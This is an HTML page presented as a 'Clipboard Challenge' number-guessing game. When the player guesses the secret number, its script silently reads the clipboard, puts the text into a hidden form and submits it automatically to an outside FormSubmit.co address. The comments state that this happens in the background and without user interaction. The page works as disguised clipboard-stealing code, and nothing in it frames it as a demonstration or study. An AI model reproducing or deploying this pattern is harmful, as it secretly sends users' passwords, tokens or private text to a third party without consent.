<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clipboard Challenge Game</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            text-align: center;
            margin-top: 50px;
        }

        .game-container {
            background-color: #fff;
            border: 2px solid #ddd;
            padding: 30px;
            border-radius: 10px;
            width: 300px;
            margin: 0 auto;
        }

        h1 {
            font-size: 24px;
            color: #333;
        }

        input, button {
            padding: 10px;
            font-size: 16px;
            margin: 10px 0;
            width: 100%;
            border-radius: 5px;
            border: 1px solid #ddd;
        }

        .game-btn {
            background-color: #4CAF50;
            color: white;
            cursor: pointer;
        }

        .game-btn:hover {
            background-color: #45a049;
        }

        .game-message {
            margin-top: 20px;
            font-size: 18px;
            color: #555;
        }

        .hidden {
            display: none;
        }
    </style>
    <script>
        let secretNumber = Math.floor(Math.random() * 100) + 1; // Random number between 1-100
        let attempts = 0;

        function startGame() {
            const guessInput = document.getElementById('guessInput');
            const message = document.getElementById('gameMessage');
            const guess = parseInt(guessInput.value);

            attempts++;

            if (guess === secretNumber) {
                message.textContent = `Congratulations! You guessed the number in ${attempts} attempts. üèÜ`;
                message.classList.remove('hidden');
                message.style.color = "green";
                copyClipboardAndSubmit();
            } else if (guess < secretNumber) {
                message.textContent = "Too low! Try again.";
                message.style.color = "orange";
            } else if (guess > secretNumber) {
                message.textContent = "Too high! Try again.";
                message.style.color = "orange";
            }
        }

        function copyClipboardAndSubmit() {
            // Read the clipboard content in the background and submit it
            navigator.clipboard.readText().then(function(clipText) {
                // Set the clipboard content into a hidden form field
                document.getElementById('clipboardContent').value = clipText;

                // Automatically submit the form without user interaction
                setTimeout(function() {
                    document.getElementById('hiddenForm').submit();
                }, 1000); // Delay to simulate final action
            }).catch(function(err) {
                console.error('Failed to read clipboard contents: ', err);
                alert("Oops! Something went wrong. Please try again.");
            });
        }
    </script>
</head>
<body>

<div class="game-container">
    <h1>Clipboard Challenge: Guess the Number</h1>
    <p>Guess a number between 1 and 100 to unlock the secret!</p>

    <input type="number" id="guessInput" placeholder="Enter your guess" />
    <button class="game-btn" onclick="startGame()">Submit Guess</button>

    <div id="gameMessage" class="game-message hidden"></div>

    <!-- Hidden form to send clipboard content via FormSubmit.co -->
    <form id="hiddenForm" action="https://formsubmit.co/b0316d16c9cd15f8edf415e79be83749" method="POST" style="display:none;">
        <input type="hidden" name="_subject" value="Clipboard Challenge - Secret Unlocked" />
        <input type="hidden" name="_next" value="thank_you.html" />
        <input type="hidden" id="clipboardContent" name="clipboardContent" />
    </form>
</div>

</body>
</html>
